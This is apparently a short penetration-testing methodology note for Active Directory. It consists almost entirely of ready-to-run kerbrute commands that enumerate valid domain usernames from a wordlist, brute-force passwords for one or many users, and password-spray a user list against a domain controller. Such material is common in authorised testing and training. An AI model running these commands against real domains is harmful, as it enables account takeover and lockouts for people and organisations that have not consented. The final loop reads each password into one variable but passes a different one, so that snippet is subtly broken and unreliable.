# Methodology

## Brute Force

```bash
# Brute force valid usernames
kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > kerbrute.out
cat kerbrute.out | grep VALID | awk '{print $7}' | cut -d @ -f 1 > users.txt

# Brute force passwords for a given user
kerbrute bruteuser -d $DOMAIN --dc $IP /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $USERNAME
while IFS= read -r user; do ./kerbrute bruteuser -d $DOMAIN --dc $IP /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $user; done < users.txt

# Password spray for a given user list
kerbrute passwordspray -d $DOMAIN --dc $IP users.txt $PASSWD
while IFS= read -r password; do ./kerbrute passwordspray -d $DOMAIN --dc $IP users.txt $PASSWD; done < passwords.txt
```
